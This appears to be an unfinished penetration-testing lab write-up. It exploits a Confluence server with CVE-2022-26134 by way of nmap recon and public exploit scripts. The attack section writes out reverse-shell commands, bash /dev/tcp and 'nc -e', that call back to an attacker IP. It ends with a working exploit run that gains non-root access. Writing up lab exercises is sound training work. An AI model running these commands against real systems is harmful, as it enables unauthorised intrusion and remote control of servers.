# Report - Flu
- Author: Henry Post
- Target: FLU
- Target IP: 192.168.54.41
- Date: 04/12/2026
# Executive Summary

tbd

# Recommendations

tbd

# Resources
- CVE-2022-26134
- https://github.com/nxtexploit/CVE-2022-26134
- https://github.com/jbaines-r7/through_the_wire/blob/main/through_the_wire.py
# Recon

We run `nmap -sS -sV FLU`.

```
???(kali?kali)-[~]
??$ nmap -sS -sV FLU
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-13 01:29 +0000
Nmap scan report for FLU (192.168.54.41)
Host is up (0.00051s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
8090/tcp open  http    Apache Tomcat (language: en)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.05 seconds
```

![](Pasted%20image%2020260412202929.png)

We notice `ssh:22` and `http:8090` is running.
# Non-root access

Visiting http://FLU:8090 shows us that the target serves Confluence.

     Powered by Atlassian Confluence 7.13.6

CVE-2022-26134 affects Confluence.

```sh
searchsploit confluence

# Confluence Server 7.12.4 - 'OGNL injection' Remote Code Execution (RCE) | java/webapps/50243.py

searchsploit -p 50243

cp /usr/share/exploitdb/exploits/java/webapps/50243.py ./

python 50243.py -u http://FLU:8090 -p "/pages/createpage-entervariables.action?SpaceKey=x"
```

This attack fails, so let's find another one.

https://github.com/nxtexploit/CVE-2022-26134

```sh
git clone https://github.com/nxtexploit/CVE-2022-26134

cd CVE-2022-26134
python CVE-2022-26134.py http://FLU:8090 "pwd"
```

![](Pasted%20image%2020260412204626.png)

We can run simple commands. Let's try for a reverse shell.

```sh
# on attacker
ip a | grep 192 #192.168.49.54 = attacker ip
nc -nvlp 4444

# on attacker too, to trigger rev shell
python CVE-2022-26134.py http://FLU:8090 "bash -i >& /dev/tcp/192.168.49.54/4444"
# this fails, but we have nc!!

python CVE-2022-26134.py http://FLU:8090 "which nc"
# this proves we have nc

# on attacker, to trigger reverse shell
python CVE-2022-26134.py http://FLU:8090 "nc -e /bin/sh 192.168.49.54 4444"
# this fails too, let's try python3 shell


```

We give up and find a new exploit.

https://github.com/jbaines-r7/through_the_wire/blob/main/through_the_wire.py

```bash
git clone https://github.com/jbaines-r7/through_the_wire/

cd ./through_the_wire/

# run on attacker
python through_the_wire.py --rhost FLU --rport 8090 --lhost 192.168.49.54 --lport 4444 --protocol "http://" --reverse-shell
```

It works.

![](Pasted%20image%2020260412205901.png)

We have non-root access.
# Root access

To get root access, well, we don't know because I'm live-writing this :)

